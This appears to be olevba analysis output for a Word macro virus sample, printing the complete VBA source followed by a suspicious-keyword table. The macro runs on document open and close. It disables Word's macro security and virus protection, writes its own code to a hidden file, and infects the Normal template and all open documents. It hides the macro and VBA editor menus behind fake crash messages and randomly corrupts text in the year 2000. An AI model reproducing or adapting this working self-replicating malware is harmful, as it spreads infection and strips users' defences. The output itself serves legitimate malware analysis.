olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan.dh-0fe4a2f7e8ca25393391cf0bea859495da7f35c0
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDoc.cls 
in file: Virus.MSWord.Ethan.dh-0fe4a2f7e8ca25393391cf0bea859495da7f35c0 - OLE stream: 'Macros/VBA/ThisDoc'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
  CommandBars("Macro").Controls("Security...").Enabled = False
  System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
  Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If

Application.EnableCancelKey = Not -1
CountofDocs = Documents.Count
For Doc = 0 To CountofDocs
If Documents.Item(Doc).VBProject.VBComponents.Item(1).Name <> "ThisDoc" Then
Set t = Documents.Item(Doc).VBProject.VBComponents.Item(1)

s = Documents.Item(Doc).Saved

begin = 1
If t.CodeModule.Find("Document_Open()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
ElseIf t.CodeModule.Find("Document_Close()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
Else
begin = 1
If t.CodeModule.Find("ToolsMacro()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
Else
begin = 1
If t.CodeModule.Find("Filetemplates()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
Else
begin = 1
If t.CodeModule.Find("ViewVBCode()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
End If
End If
End If
End If

Open "c:\hawk.___" For Input As #1
If LOF(1) = 0 Then GoTo q
i = 1
Do While Not EOF(1)
Line Input #1, a
t.CodeModule.InsertLines i, a
i = i + 1
Loop
q:
Close #1
t.Name = "ThisDoc"
If Left(Documents.Item(Doc).Name, 8) <> "Document" Then Documents.Item(Doc).SaveAs FileName:=ActiveDocument.FullName
If Documents.Item(Doc).Saved <> s Then Documents.Item(Doc).Saved = s
End If
Next Doc

SetAttr "c:\hawk.___", 0
Kill "c:\hawk.___"
End Sub

Private Sub Document_Open()

On Error Resume Next

Randomize

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
  CommandBars("Macro").Controls("Security...").Enabled = False
  System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
  Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If

If Dir("c:\hawk.___", 6) = "" Then
Open "c:\hawk.___" For Output As #1
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
Print #1, a
Next i
Close #1
SetAttr "c:\hawk.___", 6
End If

If NormalTemplate.VBProject.VBComponents.Item(1).Name <> "ThisDoc" Then
Set t = NormalTemplate.VBProject.VBComponents.Item(1)

begin = 1
If t.CodeModule.Find("Document_Open()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
Else
begin = 1
If t.CodeModule.Find("Document_Close()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
Else
begin = 1
If t.CodeModule.Find("ToolsMacro()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
Else
begin = 1
If t.CodeModule.Find("Filetemplates()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
Else
begin = 1
If t.CodeModule.Find("ViewVBCode()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
End If
End If
End If
End If
End If

Open "c:\hawk.___" For Input As #1
If LOF(1) = 0 Then GoTo x
i = 1
Do While Not EOF(1)
Line Input #1, a
t.CodeModule.InsertLines i, a
i = i + 1
Loop
x:
Close #1
t.Name = "ThisDoc"
ElseIf Rnd < 0.1 And Year(Now) = 2000 Then
With ActiveDocument.Content.Find:
    .ClearFormatting
    .Text = "e"
    .MatchCase = False
    .Replacement.ClearFormatting
    .Replacement.Font.Bold = True
    .Replacement.Text = "#5 -"
    .Execute Forward:=True, MatchCase:=False, Replace:=wdReplaceAll
End With
With ActiveDocument.Content.Find:
    .ClearFormatting
    .Text = "n"
    .MatchCase = False
    .Replacement.ClearFormatting
    .Replacement.Font.Bold = True
    .Replacement.Text = "-& "
    .Execute Forward:=True, MatchCase:=False, Replace:=wdReplaceAll
End With
With ActiveDocument.Content.Find:
    .ClearFormatting
    .Text = "."
    .MatchCase = False
    .Replacement.ClearFormatting
    .Replacement.Font.Bold = True
    .Replacement.Text = "31"
    .Execute Forward:=True, MatchCase:=False, Replace:=wdReplaceAll
End With
Selection.Next(Unit:=wdParagraph, Count:=1).Select
Selection.Delete
End If

CountofDocs = Documents.Count
For Doc = 0 To CountofDocs
If Documents.Item(Doc).VBProject.VBComponents.Item(1).Name <> "ThisDoc" Then
Set t = Documents.Item(Doc).VBProject.VBComponents.Item(1)
s = Documents.Item(Doc).Saved
begin = 1
If t.CodeModule.Find("Document_Open()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
ElseIf t.CodeModule.Find("Document_Close()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
Else
begin = 1
If t.CodeModule.Find("ToolsMacro()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
Else
begin = 1
If t.CodeModule.Find("Filetemplates()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
Else
begin = 1
If t.CodeModule.Find("ViewVBCode()", begin, 1, t.CodeModule.CoundOfLines, 1) = True Then
For Line = 0 To t.CodeModule.CountOfLines
t.CodeModule.DeleteLines begin
Next Line
End If
End If
End If
End If

Open "c:\hawk.___" For Input As #1
If LOF(1) = 0 Then GoTo q
i = 1
Do While Not EOF(1)
Line Input #1, a
t.CodeModule.InsertLines i, a
i = i + 1
Loop
q:
Close #1
t.Name = "ThisDoc"
If Left(Documents.Item(Doc).Name, 8) <> "Document" Then Documents.Item(Doc).SaveAs FileName:=ActiveDocument.FullName
If Documents.Item(Doc).Saved <> s Then Documents.Item(Doc).Saved = s
End If
Next Doc

End Sub

Private Sub ToolsMacro()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
End Sub

Private Sub Filetemplates()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
End Sub

Private Sub ViewVBCode()
MsgBox "This program has performed an illegal operation and will shut down.", vbCritical, "Microsoft Word"
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

